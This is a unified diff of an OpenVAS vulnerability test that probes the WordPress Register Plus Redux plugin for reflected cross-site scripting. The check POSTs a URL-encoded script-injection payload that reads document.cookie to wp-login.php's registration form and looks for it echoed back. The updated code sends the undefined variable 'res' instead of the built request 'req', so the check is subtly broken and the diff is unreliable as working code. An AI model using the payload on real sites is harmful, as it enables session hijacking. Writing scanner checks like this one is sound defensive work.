@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_register_plus_redux_mult_xss_vuln.nasl 7024 2017-08-30 11:51:43Z teissa $
+# $Id: gb_wordpress_register_plus_redux_mult_xss_vuln.nasl 10235 2018-06-18 13:14:33Z cfischer $
 #
 # WordPress Register Plus Redux Plugin Multiple Cross-Site Scripting Vulnerabilities
 #
@@ -24,88 +24,69 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ################################################################################
 
-tag_impact = "Successful exploitation could allow an attacker to execute
-arbitrary HTML and script code in a user's browser session in the context
-of an affected site.
-
-Impact Level: Application";
-
-tag_affected = "WordPress Register Plus Redux Plugin 3.7.3 and prior.";
-
-tag_insight = "The flaws are due to,
-- Improper validation of input passed via the 'user_login', 'user_email',
-  'firstname', 'lastname', 'website', 'aim', 'yahoo', 'jabber', 'about',
-  'password', and 'invitation_code' parameters to 'wp-login.php' (when
-  'action' is set to 'register').
-- A direct request to 'register-plus-redux.php' allows remote attackers to
-  obtain installation path in error message.";
-
-tag_solution = "No solution or patch was made available for at least one year
-since disclosure of this vulnerability. Likely none will be provided anymore.
-General solution options are to upgrade to a newer release, disable respective
-features, remove the product or replace the product by another one.";
-
-tag_summary = "The host is running WordPress Register Plus Redux Plugin and is
-prone to multiple vulnerabilities.";
-
-SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802324";
 CPE = "cpe:/a:wordpress:wordpress";
 
 if(description)
 {
-  script_oid(SCRIPT_OID);
-  script_version("$Revision: 7024 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-08-30 13:51:43 +0200 (Wed, 30 Aug 2017) $");
+  script_oid("1.3.6.1.4.1.25623.1.0.802324");
+  script_version("$Revision: 10235 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-06-18 15:14:33 +0200 (Mon, 18 Jun 2018) $");
   script_tag(name:"creation_date", value:"2011-08-18 14:57:45 +0200 (Thu, 18 Aug 2011)");
   script_bugtraq_id(45179);
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
   script_name("WordPress Register Plus Redux Plugin Multiple Cross-Site Scripting Vulnerabilities");
-  script_xref(name : "URL" , value : "http://websecurity.com.ua/4542/");
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/45503/");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/103773/registerplus373-xss.txt");
-
-  script_tag(name:"qod_type", value:"remote_vul");
   script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
   script_dependencies("secpod_wordpress_detect_900182.nasl");
   script_require_ports("Services/www", 80);
-  script_require_keys("wordpress/installed");
-  script_tag(name : "impact" , value : tag_impact);
-  script_tag(name : "affected" , value : tag_affected);
-  script_tag(name : "insight" , value : tag_insight);
-  script_tag(name : "solution" , value : tag_solution);
-  script_tag(name : "summary" , value : tag_summary);
+  script_mandatory_keys("wordpress/installed");
+
+  script_xref(name:"URL", value:"http://websecurity.com.ua/4542/");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/45503/");
+  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/103773/registerplus373-xss.txt");
+
+  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to execute
+  arbitrary HTML and script code in a user's browser session in the context of an affected site.
+
+  Impact Level: Application");
+
+  script_tag(name:"affected", value:"WordPress Register Plus Redux Plugin 3.7.3 and prior.");
+
+  script_tag(name:"insight", value:"The flaws are due to,
+
+  - Improper validation of input passed via the 'user_login', 'user_email',
+  'firstname', 'lastname', 'website', 'aim', 'yahoo', 'jabber', 'about',
+  'password', and 'invitation_code' parameters to 'wp-login.php' (when
+  'action' is set to 'register').
+
+  - A direct request to 'register-plus-redux.php' allows remote attackers to
+  obtain installation path in error message.");
+
+  script_tag(name:"solution", value:"No known solution was made available for at least one year
+  since the disclosure of this vulnerability. Likely none will be provided anymore.
+  General solution options are to upgrade to a newer release, disable respective
+  features, remove the product or replace the product by another one.");
+
+  script_tag(name:"summary", value:"The host is running WordPress Register Plus Redux Plugin and is
+  prone to multiple vulnerabilities.");
+
   script_tag(name:"solution_type", value:"WillNotFix");
+  script_tag(name:"qod_type", value:"remote_vul");
+
   exit(0);
 }
 
-
 include("http_func.inc");
-include("version_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
+if(!port = get_app_port(cpe:CPE))exit(0);
+if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
+if(dir == "/") dir = "";
+url = string(dir + "/wp-login.php?action=register");
 
-## Get HTTP Port
-wpPort = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
-if(!wpPort){
-  exit(0);
-}
-
-## Check Host Supports PHP
-if(!can_host_php(port:wpPort)){
-  exit(0);
-}
-
-## Get WordPress Directory
-if(!wpDir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:wpPort))exit(0);
-
-
-## Try an exploit
-filename = string(wpDir + "/wp-login.php?action=register");
-host = get_host_name();
 authVariables = "user_login=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C" +
                 "%2Fscript%3E&user_email=%22%3E%3Cscript%3Ealert%28document" +
                 ".cookie%29%3C%2Fscript%3E&first_name=%22%3E%3Cscript%3Eale" +
@@ -114,20 +95,19 @@ authVariables = "user_login=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C" +
                 "m=&yahoo=&jabber=&description=&redirect_to=&wp-submit=Regi" +
                 "ster";
 
-## Construct post request
-sndReq2 = string("POST ", filename, " HTTP/1.1\r\n",
-                 "Host: ", host, "\r\n",
-                 "Content-Type: application/x-www-form-urlencoded\r\n",
-                 "Content-Length: ", strlen(authVariables), "\r\n\r\n",
-                  authVariables);
+host = http_host_name(port:port);
 
-rcvRes2 = http_keepalive_send_recv(port:wpPort, data:sndReq2);
+req = string("POST ", url, " HTTP/1.1\r\n",
+             "Host: ", host, "\r\n",
+             "Content-Type: application/x-www-form-urlencoded\r\n",
+             "Content-Length: ", strlen(authVariables), "\r\n\r\n",
+             authVariables);
+res = http_keepalive_send_recv(port:port, data:res);
 
-## Check the response to confirm vulnerability
-if(egrep(pattern:"^HTTP/.* 200 OK", string:rcvRes2) &&
-        ("><script>alert(document.cookie)</script>" >< rcvRes2))
-{
-  security_message(wpPort);
+if(egrep(pattern:"^HTTP/1\.[01] 200", string:res) && ("><script>alert(document.cookie)</script>" >< res)){
+  report = report_vuln_url(port:port, url:url);
+  security_message(port:port, data:report);
   exit(0);
 }
 
+exit(99);
